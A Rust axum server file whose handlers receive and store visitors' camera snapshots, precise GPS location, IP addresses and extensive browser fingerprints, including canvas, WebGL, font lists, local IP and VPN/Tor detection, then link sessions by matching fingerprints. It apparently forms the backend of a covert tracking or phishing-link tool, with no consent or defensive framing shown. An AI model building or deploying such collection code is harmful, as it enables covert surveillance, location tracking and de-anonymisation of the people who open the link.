use crate::AppState;
use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde::Deserialize;
use std::sync::Arc;
use base64::Engine;

#[derive(Deserialize)]
pub struct ImagePayload {
    cat: String,
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    capture_method: Option<String>,
}

#[derive(Deserialize)]
pub struct LocationPayload {
    lat: f64,
    lon: f64,
    #[serde(default)]
    acc: Option<f64>,
    #[serde(default)]
    altitude: Option<f64>,
    #[serde(default)]
    heading: Option<f64>,
    #[serde(default)]
    speed: Option<f64>,
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct IpPayload {
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct FingerprintPayload {
    #[serde(default)]
    session: Option<String>,
    screen_resolution: Option<String>,
    color_depth: Option<i32>,
    timezone: Option<String>,
    language: Option<String>,
    platform: Option<String>,
    hardware_concurrency: Option<i32>,
    device_memory: Option<f64>,
    battery_level: Option<f64>,
    battery_charging: Option<bool>,
    canvas_fingerprint: Option<String>,
    webgl_fingerprint: Option<String>,
    font_list: Option<String>,
    local_ip: Option<String>,
    is_vpn: Option<bool>,
    is_tor: Option<bool>,
    connection_type: Option<String>,
}

#[derive(Deserialize)]
pub struct EventPayload {
    #[serde(default)]
    session: Option<String>,
    event_type: String,
    #[serde(default)]
    event_data: Option<serde_json::Value>,
}

pub async fn receive_image(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<ImagePayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let filtered = payload.cat.split(',').nth(1).unwrap_or("");
    let raw = base64::engine::general_purpose::STANDARD.decode(filtered)
        .map_err(|_| StatusCode::BAD_REQUEST)?;
    if raw.is_empty() { return Err(StatusCode::BAD_REQUEST); }

    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S"));
    let file_path = format!("{}/captures/{}", state.data_dir, filename);
    let method = payload.capture_method.unwrap_or_else(|| "canvas".into());

    std::fs::write(&file_path, &raw).map_err(|e| { tracing::error!("File write failed: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    sqlx::query(
        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, capture_method, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&filename)
    .bind(raw.len() as i64).bind(&file_path).bind(&method).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite capture insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "camera_capture", serde_json::json!({"filename": filename, "size": raw.len(), "method": method})).await;
    tracing::info!("📸 Capture: {} ({} bytes, {})", filename, raw.len(), method);
    Ok(StatusCode::OK)
}

pub async fn receive_location(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<LocationPayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, altitude, heading, speed, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
    .bind(payload.lat).bind(payload.lon).bind(payload.acc)
    .bind(payload.altitude).bind(payload.heading).bind(payload.speed).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite location insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "location_granted", serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc})).await;
    tracing::info!("📍 Location: {}, {}", payload.lat, payload.lon);
    Ok(StatusCode::OK)
}

pub async fn receive_ip(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<IpPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let session_id = body.session.unwrap_or_else(|| "default".into());
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite IP insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "page_visit", serde_json::json!({"ip": ip, "device": device, "browser": browser})).await;
    tracing::info!("🌐 IP: {} ({} on {})", ip, browser, os);
    Ok(StatusCode::OK)
}

pub async fn receive_fingerprint(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<FingerprintPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, local_ip, screen_resolution, color_depth, timezone, language, platform, hardware_concurrency, device_memory, battery_level, battery_charging, canvas_fingerprint, webgl_fingerprint, font_list, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os).bind(&payload.local_ip)
    .bind(&payload.screen_resolution).bind(payload.color_depth).bind(&payload.timezone)
    .bind(&payload.language).bind(&payload.platform).bind(payload.hardware_concurrency)
    .bind(payload.device_memory).bind(payload.battery_level)
    .bind(payload.battery_charging).bind(&payload.canvas_fingerprint)
    .bind(&payload.webgl_fingerprint).bind(&payload.font_list).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite fingerprint insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    // Cross-session correlation check
    if let Some(ref canvas_fp) = payload.canvas_fingerprint {
        let matches: Vec<(String,)> = sqlx::query_as(
            "SELECT DISTINCT session_id FROM ip_logs WHERE canvas_fingerprint = ? AND session_id != ?"
        ).bind(canvas_fp).bind(&session_id).fetch_all(&state.pool).await.unwrap_or_default();

        if !matches.is_empty() {
            let other_sessions: Vec<String> = matches.into_iter().map(|(s,)| s).collect();
            tracing::warn!("🔗 Cross-session correlation: fingerprint matches sessions: {:?}", other_sessions);
            log_event(&state, &session_id, "cross_session_match", serde_json::json!({"matched_sessions": other_sessions, "fingerprint": canvas_fp})).await;
        }
    }

    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({
        "canvas": payload.canvas_fingerprint.is_some(),
        "webgl": payload.webgl_fingerprint.is_some(),
        "local_ip": payload.local_ip,
        "fonts_count": payload.font_list.as_ref().map(|f| f.split(',').count()),
    })).await;

    tracing::info!("🔍 Fingerprint: {} | {} | {} | canvas:{} | local_ip:{}",
        ip, payload.screen_resolution.as_deref().unwrap_or("?"),
        payload.timezone.as_deref().unwrap_or("?"),
        payload.canvas_fingerprint.is_some(),
        payload.local_ip.as_deref().unwrap_or("none"));
    Ok(StatusCode::OK)
}

pub async fn receive_event(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<EventPayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let data_str = payload.event_data.map(|d| serde_json::to_string(&d).unwrap_or_default());
    let now = chrono::Utc::now().timestamp();

    sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
        .bind(&payload.event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite event insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    Ok(StatusCode::OK)
}

async fn log_event(state: &AppState, session_id: &str, event_type: &str, data: serde_json::Value) {
    let now = chrono::Utc::now().timestamp();
    let data_str = serde_json::to_string(&data).unwrap_or_default();
    let _ = sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(session_id)
        .bind(event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await;
}

fn extract_ip(headers: &HeaderMap) -> String {
    headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| s.split(',').next())
        .or_else(|| headers.get("x-real-ip").and_then(|v| v.to_str().ok()))
        .unwrap_or("unknown")
        .trim()
        .to_string()
}

fn parse_ua(ua: &str) -> (String, String, String) {
    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") { "Mobile" }
        else if ua.contains("Tablet") || ua.contains("iPad") { "Tablet" }
        else { "Desktop" };
    let browser = if ua.contains("Edg/") { "Edge" }
        else if ua.contains("Chrome/") { "Chrome" }
        else if ua.contains("Firefox/") { "Firefox" }
        else if ua.contains("Safari/") && !ua.contains("Chrome") { "Safari" }
        else { "Unknown" };
    let os = if ua.contains("Windows NT") { "Windows" }
        else if ua.contains("Mac OS X") { "macOS" }
        else if ua.contains("Android") { "Android" }
        else if ua.contains("iPhone") || ua.contains("iPad") || ua.contains("iOS") { "iOS" }
        else if ua.contains("Linux") { "Linux" }
        else { "Unknown" };
    (device.into(), browser.into(), os.into())
}
